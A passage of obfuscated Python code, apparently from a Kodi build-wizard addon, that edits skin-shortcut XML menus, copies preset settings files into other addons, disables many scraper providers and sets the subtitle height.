    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1192
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1193
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1194
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1212
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1215
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1216
    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1220
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1221
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1222
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1240
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1243
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1244
    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1248
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1249
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1250
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1268
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1271
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1272
    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1275
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1276
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1277
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1295
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1298
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1299
    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1301
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1302
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1303
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1321
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1324
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1325
    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1327
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1328
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1329
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1347
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1350
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1351
    OOOOO00O0O000OO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1354
    with open (OOOOO00O0O000OO0O ,'r')as OOO0OO00000O0OOO0 :#line:1355
      OO0OO00000000OO00 =OOO0OO00000O0OOO0 .read ()#line:1356
    OO0OO00000000OO00 =OO0OO00000000OO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1374
    with open (OOOOO00O0O000OO0O ,'w')as OOO0OO00000O0OOO0 :#line:1377
      OOO0OO00000O0OOO0 .write (OO0OO00000000OO00 )#line:1378
def rdbuildinstallON ():#line:1381
    try :#line:1383
       OO00OOO00OOOO0O0O =ADDONPATH +"/resources/rd/victory.xml"#line:1384
       OO00O0000OOOO00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1385
       copyfile (OO00OOO00OOOO0O0O ,OO00O0000OOOO00OO )#line:1387
       OO00OOO00OOOO0O0O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1389
       OO00O0000OOOO00OO =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1390
       copyfile (OO00OOO00OOOO0O0O ,OO00O0000OOOO00OO )#line:1392
       OO00OOO00OOOO0O0O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1394
       OO00O0000OOOO00OO =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1395
       copyfile (OO00OOO00OOOO0O0O ,OO00O0000OOOO00OO )#line:1397
       OO00OOO00OOOO0O0O =ADDONPATH +"/resources/rd/Splash.png"#line:1400
       OO00O0000OOOO00OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1401
       copyfile (OO00OOO00OOOO0O0O ,OO00O0000OOOO00OO )#line:1403
    except :#line:1405
       pass #line:1406
def rdbuild ():#line:1416
	OOOOO00000O0O0O00 =(ADDON .getSetting ("auto_rd"))#line:1417
	if OOOOO00000O0O0O00 =='true':#line:1418
		O0OO0OOO00OO0OOO0 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1419
		O0OO0OOO00OO0OOO0 .setSetting ('all_t','0')#line:1420
		O0OO0OOO00OO0OOO0 .setSetting ('rd_menu_enable','false')#line:1421
		O0OO0OOO00OO0OOO0 .setSetting ('magnet_bay','false')#line:1422
		O0OO0OOO00OO0OOO0 .setSetting ('magnet_extra','false')#line:1423
		O0OO0OOO00OO0OOO0 .setSetting ('rd_only','false')#line:1424
		O0OO0OOO00OO0OOO0 .setSetting ('ftp','false')#line:1426
		O0OO0OOO00OO0OOO0 .setSetting ('fp','false')#line:1427
		O0OO0OOO00OO0OOO0 .setSetting ('filter_fp','false')#line:1428
		O0OO0OOO00OO0OOO0 .setSetting ('fp_size_en','false')#line:1429
		O0OO0OOO00OO0OOO0 .setSetting ('afdah','false')#line:1430
		O0OO0OOO00OO0OOO0 .setSetting ('ap2s','false')#line:1431
		O0OO0OOO00OO0OOO0 .setSetting ('cin','false')#line:1432
		O0OO0OOO00OO0OOO0 .setSetting ('clv','false')#line:1433
		O0OO0OOO00OO0OOO0 .setSetting ('cmv','false')#line:1434
		O0OO0OOO00OO0OOO0 .setSetting ('dl20','false')#line:1435
		O0OO0OOO00OO0OOO0 .setSetting ('esc','false')#line:1436
		O0OO0OOO00OO0OOO0 .setSetting ('extra','false')#line:1437
		O0OO0OOO00OO0OOO0 .setSetting ('film','false')#line:1438
		O0OO0OOO00OO0OOO0 .setSetting ('fre','false')#line:1439
		O0OO0OOO00OO0OOO0 .setSetting ('fxy','false')#line:1440
		O0OO0OOO00OO0OOO0 .setSetting ('genv','false')#line:1441
		O0OO0OOO00OO0OOO0 .setSetting ('getgo','false')#line:1442
		O0OO0OOO00OO0OOO0 .setSetting ('gold','false')#line:1443
		O0OO0OOO00OO0OOO0 .setSetting ('gona','false')#line:1444
		O0OO0OOO00OO0OOO0 .setSetting ('hdmm','false')#line:1445
		O0OO0OOO00OO0OOO0 .setSetting ('hdt','false')#line:1446
		O0OO0OOO00OO0OOO0 .setSetting ('icy','false')#line:1447
		O0OO0OOO00OO0OOO0 .setSetting ('ind','false')#line:1448
		O0OO0OOO00OO0OOO0 .setSetting ('iwi','false')#line:1449
		O0OO0OOO00OO0OOO0 .setSetting ('jen_free','false')#line:1450
		O0OO0OOO00OO0OOO0 .setSetting ('kiss','false')#line:1451
		O0OO0OOO00OO0OOO0 .setSetting ('lavin','false')#line:1452
		O0OO0OOO00OO0OOO0 .setSetting ('los','false')#line:1453
		O0OO0OOO00OO0OOO0 .setSetting ('m4u','false')#line:1454
		O0OO0OOO00OO0OOO0 .setSetting ('mesh','false')#line:1455
		O0OO0OOO00OO0OOO0 .setSetting ('mf','false')#line:1456
		O0OO0OOO00OO0OOO0 .setSetting ('mkvc','false')#line:1457
		O0OO0OOO00OO0OOO0 .setSetting ('mjy','false')#line:1458
		O0OO0OOO00OO0OOO0 .setSetting ('hdonline','false')#line:1459
		O0OO0OOO00OO0OOO0 .setSetting ('moviex','false')#line:1460
		O0OO0OOO00OO0OOO0 .setSetting ('mpr','false')#line:1461
		O0OO0OOO00OO0OOO0 .setSetting ('mvg','false')#line:1462
		O0OO0OOO00OO0OOO0 .setSetting ('mvl','false')#line:1463
		O0OO0OOO00OO0OOO0 .setSetting ('mvs','false')#line:1464
		O0OO0OOO00OO0OOO0 .setSetting ('myeg','false')#line:1465
		O0OO0OOO00OO0OOO0 .setSetting ('ninja','false')#line:1466
		O0OO0OOO00OO0OOO0 .setSetting ('odb','false')#line:1467
		O0OO0OOO00OO0OOO0 .setSetting ('ophd','false')#line:1468
		O0OO0OOO00OO0OOO0 .setSetting ('pks','false')#line:1469
		O0OO0OOO00OO0OOO0 .setSetting ('prf','false')#line:1470
		O0OO0OOO00OO0OOO0 .setSetting ('put18','false')#line:1471
		O0OO0OOO00OO0OOO0 .setSetting ('req','false')#line:1472
		O0OO0OOO00OO0OOO0 .setSetting ('rftv','false')#line:1473
		O0OO0OOO00OO0OOO0 .setSetting ('rltv','false')#line:1474
		O0OO0OOO00OO0OOO0 .setSetting ('sc','false')#line:1475
		O0OO0OOO00OO0OOO0 .setSetting ('seehd','false')#line:1476
		O0OO0OOO00OO0OOO0 .setSetting ('showbox','false')#line:1477
		O0OO0OOO00OO0OOO0 .setSetting ('shuid','false')#line:1478
		O0OO0OOO00OO0OOO0 .setSetting ('sil_gh','false')#line:1479
		O0OO0OOO00OO0OOO0 .setSetting ('spv','false')#line:1480
		O0OO0OOO00OO0OOO0 .setSetting ('subs','false')#line:1481
		O0OO0OOO00OO0OOO0 .setSetting ('tvs','false')#line:1482
		O0OO0OOO00OO0OOO0 .setSetting ('tw','false')#line:1483
		O0OO0OOO00OO0OOO0 .setSetting ('upto','false')#line:1484
		O0OO0OOO00OO0OOO0 .setSetting ('vel','false')#line:1485
		O0OO0OOO00OO0OOO0 .setSetting ('vex','false')#line:1486
		O0OO0OOO00OO0OOO0 .setSetting ('vidc','false')#line:1487
		O0OO0OOO00OO0OOO0 .setSetting ('w4hd','false')#line:1488
		O0OO0OOO00OO0OOO0 .setSetting ('wav','false')#line:1489
		O0OO0OOO00OO0OOO0 .setSetting ('wf','false')#line:1490
		O0OO0OOO00OO0OOO0 .setSetting ('wse','false')#line:1491
		O0OO0OOO00OO0OOO0 .setSetting ('wss','false')#line:1492
		O0OO0OOO00OO0OOO0 .setSetting ('wsse','false')#line:1493
		O0OO0OOO00OO0OOO0 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1494
		O0OO0OOO00OO0OOO0 .setSetting ('debrid.only','true')#line:1495
		O0OO0OOO00OO0OOO0 .setSetting ('hosts.captcha','false')#line:1496
		O0OO0OOO00OO0OOO0 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1497
		O0OO0OOO00OO0OOO0 .setSetting ('provider.123moviehd','false')#line:1498
		O0OO0OOO00OO0OOO0 .setSetting ('provider.300mbdownload','false')#line:1499
		O0OO0OOO00OO0OOO0 .setSetting ('provider.alltube','false')#line:1500
		O0OO0OOO00OO0OOO0 .setSetting ('provider.allucde','false')#line:1501
		O0OO0OOO00OO0OOO0 .setSetting ('provider.animebase','false')#line:1502
		O0OO0OOO00OO0OOO0 .setSetting ('provider.animeloads','false')#line:1503
		O0OO0OOO00OO0OOO0 .setSetting ('provider.animetoon','false')#line:1504
		O0OO0OOO00OO0OOO0 .setSetting ('provider.bnwmovies','false')#line:1505
		O0OO0OOO00OO0OOO0 .setSetting ('provider.boxfilm','false')#line:1506
		O0OO0OOO00OO0OOO0 .setSetting ('provider.bs','false')#line:1507
		O0OO0OOO00OO0OOO0 .setSetting ('provider.cartoonhd','false')#line:1508
		O0OO0OOO00OO0OOO0 .setSetting ('provider.cdahd','false')#line:1509
		O0OO0OOO00OO0OOO0 .setSetting ('provider.cdax','false')#line:1510
		O0OO0OOO00OO0OOO0 .setSetting ('provider.cine','false')#line:1511
		O0OO0OOO00OO0OOO0 .setSetting ('provider.cinenator','false')#line:1512
		O0OO0OOO00OO0OOO0 .setSetting ('provider.cmovieshdbz','false')#line:1513
		O0OO0OOO00OO0OOO0 .setSetting ('provider.coolmoviezone','false')#line:1514
		O0OO0OOO00OO0OOO0 .setSetting ('provider.ddl','false')#line:1515
		O0OO0OOO00OO0OOO0 .setSetting ('provider.deepmovie','false')#line:1516
		O0OO0OOO00OO0OOO0 .setSetting ('provider.ekinomaniak','false')#line:1517
		O0OO0OOO00OO0OOO0 .setSetting ('provider.ekinotv','false')#line:1518
		O0OO0OOO00OO0OOO0 .setSetting ('provider.filiser','false')#line:1519
		O0OO0OOO00OO0OOO0 .setSetting ('provider.filmpalast','false')#line:1520
		O0OO0OOO00OO0OOO0 .setSetting ('provider.filmwebbooster','false')#line:1521
		O0OO0OOO00OO0OOO0 .setSetting ('provider.filmxy','false')#line:1522
		O0OO0OOO00OO0OOO0 .setSetting ('provider.fmovies','false')#line:1523
		O0OO0OOO00OO0OOO0 .setSetting ('provider.foxx','false')#line:1524
		O0OO0OOO00OO0OOO0 .setSetting ('provider.freefmovies','false')#line:1525
		O0OO0OOO00OO0OOO0 .setSetting ('provider.freeputlocker','false')#line:1526
		O0OO0OOO00OO0OOO0 .setSetting ('provider.furk','false')#line:1527
		O0OO0OOO00OO0OOO0 .setSetting ('provider.gamatotv','false')#line:1528
		O0OO0OOO00OO0OOO0 .setSetting ('provider.gogoanime','false')#line:1529
		O0OO0OOO00OO0OOO0 .setSetting ('provider.gowatchseries','false')#line:1530
		O0OO0OOO00OO0OOO0 .setSetting ('provider.hackimdb','false')#line:1531
		O0OO0OOO00OO0OOO0 .setSetting ('provider.hdfilme','false')#line:1532
		O0OO0OOO00OO0OOO0 .setSetting ('provider.hdmto','false')#line:1533
		O0OO0OOO00OO0OOO0 .setSetting ('provider.hdpopcorns','false')#line:1534
		O0OO0OOO00OO0OOO0 .setSetting ('provider.hdstreams','false')#line:1535
		O0OO0OOO00OO0OOO0 .setSetting ('provider.horrorkino','false')#line:1537
		O0OO0OOO00OO0OOO0 .setSetting ('provider.iitv','false')#line:1538
		O0OO0OOO00OO0OOO0 .setSetting ('provider.iload','false')#line:1539
		O0OO0OOO00OO0OOO0 .setSetting ('provider.iwaatch','false')#line:1540
		O0OO0OOO00OO0OOO0 .setSetting ('provider.kinodogs','false')#line:1541
		O0OO0OOO00OO0OOO0 .setSetting ('provider.kinoking','false')#line:1542
		O0OO0OOO00OO0OOO0 .setSetting ('provider.kinow','false')#line:1543
		O0OO0OOO00OO0OOO0 .setSetting ('provider.kinox','false')#line:1544
		O0OO0OOO00OO0OOO0 .setSetting ('provider.lichtspielhaus','false')#line:1545
		O0OO0OOO00OO0OOO0 .setSetting ('provider.liomenoi','false')#line:1546
		O0OO0OOO00OO0OOO0 .setSetting ('provider.magnetdl','false')#line:1549
		O0OO0OOO00OO0OOO0 .setSetting ('provider.megapelistv','false')#line:1550
		O0OO0OOO00OO0OOO0 .setSetting ('provider.movie2k-ac','false')#line:1551
		O0OO0OOO00OO0OOO0 .setSetting ('provider.movie2k-ag','false')#line:1552
		O0OO0OOO00OO0OOO0 .setSetting ('provider.movie2z','false')#line:1553
		O0OO0OOO00OO0OOO0 .setSetting ('provider.movie4k','false')#line:1554
		O0OO0OOO00OO0OOO0 .setSetting ('provider.movie4kis','false')#line:1555
		O0OO0OOO00OO0OOO0 .setSetting ('provider.movieneo','false')#line:1556
		O0OO0OOO00OO0OOO0 .setSetting ('provider.moviesever','false')#line:1557
		O0OO0OOO00OO0OOO0 .setSetting ('provider.movietown','false')#line:1558
		O0OO0OOO00OO0OOO0 .setSetting ('provider.mvrls','false')#line:1560
		O0OO0OOO00OO0OOO0 .setSetting ('provider.netzkino','false')#line:1561
		O0OO0OOO00OO0OOO0 .setSetting ('provider.odb','false')#line:1562
		O0OO0OOO00OO0OOO0 .setSetting ('provider.openkatalog','false')#line:1563
		O0OO0OOO00OO0OOO0 .setSetting ('provider.ororo','false')#line:1564
		O0OO0OOO00OO0OOO0 .setSetting ('provider.paczamy','false')#line:1565
		O0OO0OOO00OO0OOO0 .setSetting ('provider.peliculasdk','false')#line:1566
		O0OO0OOO00OO0OOO0 .setSetting ('provider.pelisplustv','false')#line:1567
		O0OO0OOO00OO0OOO0 .setSetting ('provider.pepecine','false')#line:1568
		O0OO0OOO00OO0OOO0 .setSetting ('provider.primewire','false')#line:1569
		O0OO0OOO00OO0OOO0 .setSetting ('provider.projectfreetv','false')#line:1570
		O0OO0OOO00OO0OOO0 .setSetting ('provider.proxer','false')#line:1571
		O0OO0OOO00OO0OOO0 .setSetting ('provider.pureanime','false')#line:1572
		O0OO0OOO00OO0OOO0 .setSetting ('provider.putlocker','false')#line:1573
		O0OO0OOO00OO0OOO0 .setSetting ('provider.putlockerfree','false')#line:1574
		O0OO0OOO00OO0OOO0 .setSetting ('provider.reddit','false')#line:1575
		O0OO0OOO00OO0OOO0 .setSetting ('provider.cartoonwire','false')#line:1576
		O0OO0OOO00OO0OOO0 .setSetting ('provider.seehd','false')#line:1577
		O0OO0OOO00OO0OOO0 .setSetting ('provider.segos','false')#line:1578
		O0OO0OOO00OO0OOO0 .setSetting ('provider.serienstream','false')#line:1579
		O0OO0OOO00OO0OOO0 .setSetting ('provider.series9','false')#line:1580
		O0OO0OOO00OO0OOO0 .setSetting ('provider.seriesever','false')#line:1581
		O0OO0OOO00OO0OOO0 .setSetting ('provider.seriesonline','false')#line:1582
		O0OO0OOO00OO0OOO0 .setSetting ('provider.seriespapaya','false')#line:1583
		O0OO0OOO00OO0OOO0 .setSetting ('provider.sezonlukdizi','false')#line:1584
		O0OO0OOO00OO0OOO0 .setSetting ('provider.solarmovie','false')#line:1585
		O0OO0OOO00OO0OOO0 .setSetting ('provider.solarmoviez','false')#line:1586
		O0OO0OOO00OO0OOO0 .setSetting ('provider.stream-to','false')#line:1587
		O0OO0OOO00OO0OOO0 .setSetting ('provider.streamdream','false')#line:1588
		O0OO0OOO00OO0OOO0 .setSetting ('provider.streamflix','false')#line:1589
		O0OO0OOO00OO0OOO0 .setSetting ('provider.streamit','false')#line:1590
		O0OO0OOO00OO0OOO0 .setSetting ('provider.swatchseries','false')#line:1591
		O0OO0OOO00OO0OOO0 .setSetting ('provider.szukajkatv','false')#line:1592
		O0OO0OOO00OO0OOO0 .setSetting ('provider.tainiesonline','false')#line:1593
		O0OO0OOO00OO0OOO0 .setSetting ('provider.tainiomania','false')#line:1594
		O0OO0OOO00OO0OOO0 .setSetting ('provider.tata','false')#line:1597
		O0OO0OOO00OO0OOO0 .setSetting ('provider.trt','false')#line:1598
		O0OO0OOO00OO0OOO0 .setSetting ('provider.tvbox','false')#line:1599
		O0OO0OOO00OO0OOO0 .setSetting ('provider.ultrahd','false')#line:1600
		O0OO0OOO00OO0OOO0 .setSetting ('provider.video4k','false')#line:1601
		O0OO0OOO00OO0OOO0 .setSetting ('provider.vidics','false')#line:1602
		O0OO0OOO00OO0OOO0 .setSetting ('provider.view4u','false')#line:1603
		O0OO0OOO00OO0OOO0 .setSetting ('provider.watchseries','false')#line:1604
		O0OO0OOO00OO0OOO0 .setSetting ('provider.xrysoi','false')#line:1605
		O0OO0OOO00OO0OOO0 .setSetting ('provider.library','false')#line:1606
def fixfont ():#line:1609
	OOO00O00OO000O00O =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.GetSettings","id":1}')#line:1610
	OO0O0O0000O0000OO =json .loads (OOO00O00OO000O00O );#line:1612
	OOOOOO0O00OO000O0 =OO0O0O0000O0000OO ["result"]["settings"]#line:1613
	O0O0OOO0OOOO0O0OO =[O0000O00OOO00OO0O for O0000O00OOO00OO0O in OOOOOO0O00OO000O0 if O0000O00OOO00OO0O ["id"]=="audiooutput.audiodevice"][0 ]#line:1615
	O0OO0O0OO0O00O0O0 =O0O0OOO0OOOO0O0OO ["options"];#line:1616
	OOO0O0OO0O000OOO0 =O0O0OOO0OOOO0O0OO ["value"];#line:1617
	OO0O00OOO00OO0000 =[O000OOOOOO00O0000 for (O000OOOOOO00O0000 ,OOOOO0OO00O0O0OO0 )in enumerate (O0OO0O0OO0O00O0O0 )if OOOOO0OO00O0O0OO0 ["value"]==OOO0O0OO0O000OOO0 ][0 ];#line:1619
	O0O0O0O00O0OO0O0O =(OO0O00OOO00OO0000 +1 )%len (O0OO0O0OO0O00O0O0 )#line:1621
	O0OOO00OOOO00OO0O =O0OO0O0OO0O00O0O0 [O0O0O0O00O0OO0O0O ]["value"]#line:1623
	O0OO0OO000OO0OOO0 =O0OO0O0OO0O00O0O0 [O0O0O0O00O0OO0O0O ]["label"]#line:1624
	O0OO0OO000000OOOO =xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","params":{"setting":"subtitles.height","value":40},"id":1}')#line:1626
	try :#line:1628
		O000OOO0000OO0000 =json .loads (O0OO0OO000000OOOO );#line:1629
		if O000OOO0000OO0000 ["result"]!=True :#line:1631
			raise Exception #line:1632
	except :#line:1633
		sys .stderr .write ("Error switching audio output device")#line:1634
		raise Exception #line:1635
def parseDOM2 (OOOO0O000O0OOOO00 ,name =u"",attrs ={},ret =False ):#line:1636
	if isinstance (OOOO0O000O0OOOO00 ,str ):#line:1639
		try :#line:1640
			OOOO0O000O0OOOO00 =[OOOO0O000O0OOOO00 .decode ("utf-8")]#line:1641
		except :#line:1642
			OOOO0O000O0OOOO00 =[OOOO0O000O0OOOO00 ]#line:1643
	elif isinstance (OOOO0O000O0OOOO00 ,unicode ):#line:1644
		OOOO0O000O0OOOO00 =[OOOO0O000O0OOOO00 ]#line:1645
	elif not isinstance (OOOO0O000O0OOOO00 ,list ):#line:1646
		return u""#line:1647
	if not name .strip ():#line:1649
		return u""#line:1650
	OO00O000OO00OO000 =[]#line:1652
	for O000000O000OO0O00 in OOOO0O000O0OOOO00 :#line:1653
		O0000O00OO0OO0O00 =re .compile ('(<[^>]*?\n[^>]*?>)').findall (O000000O000OO0O00 )#line:1654
		for OO00O0O0O0000000O in O0000O00OO0OO0O00 :#line:1655
			O000000O000OO0O00 =O000000O000OO0O00 .replace (OO00O0O0O0000000O ,OO00O0O0O0000000O .replace ("\n"," "))#line:1656
		OOOO0OO00OO0OO0O0 =[]#line:1658
		for O0O0O0O000000O000 in attrs :#line:1659
			O0OO0OOO00O0O000O =re .compile ('(<'+name +'[^>]*?(?:'+O0O0O0O000000O000 +'=[\'"]'+attrs [O0O0O0O000000O000 ]+'[\'"].*?>))',re .M |re .S ).findall (O000000O000OO0O00 )#line:1660
			if len (O0OO0OOO00O0O000O )==0 and attrs [O0O0O0O000000O000 ].find (" ")==-1 :#line:1661
				O0OO0OOO00O0O000O =re .compile ('(<'+name +'[^>]*?(?:'+O0O0O0O000000O000 +'='+attrs [O0O0O0O000000O000 ]+'.*?>))',re .M |re .S ).findall (O000000O000OO0O00 )#line:1662
			if len (OOOO0OO00OO0OO0O0 )==0 :#line:1664
				OOOO0OO00OO0OO0O0 =O0OO0OOO00O0O000O #line:1665
				O0OO0OOO00O0O000O =[]#line:1666
			else :#line:1667
				O0OOOOO0O0OO0OO0O =range (len (OOOO0OO00OO0OO0O0 ))#line:1668
				O0OOOOO0O0OO0OO0O .reverse ()#line:1669
				for OOOO0OO00000O0O00 in O0OOOOO0O0OO0OO0O :#line:1670
					if not OOOO0OO00OO0OO0O0 [OOOO0OO00000O0O00 ]in O0OO0OOO00O0O000O :#line:1671
						del (OOOO0OO00OO0OO0O0 [OOOO0OO00000O0O00 ])#line:1672
		if len (OOOO0OO00OO0OO0O0 )==0 and attrs =={}:#line:1674
			OOOO0OO00OO0OO0O0 =re .compile ('(<'+name +'>)',re .M |re .S ).findall (O000000O000OO0O00 )#line:1675
			if len (OOOO0OO00OO0OO0O0 )==0 :#line:1676
				OOOO0OO00OO0OO0O0 =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (O000000O000OO0O00 )#line:1677
		if isinstance (ret ,str ):#line:1679
			O0OO0OOO00O0O000O =[]#line:1680
			for OO00O0O0O0000000O in OOOO0OO00OO0OO0O0 :#line:1681
				OOO0000OO0O0OO000 =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO00O0O0O0000000O )#line:1682
				if len (OOO0000OO0O0OO000 )==0 :#line:1683
					OOO0000OO0O0OO000 =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO00O0O0O0000000O )#line:1684
				for OOO00OOO0OO0OOO0O in OOO0000OO0O0OO000 :#line:1685
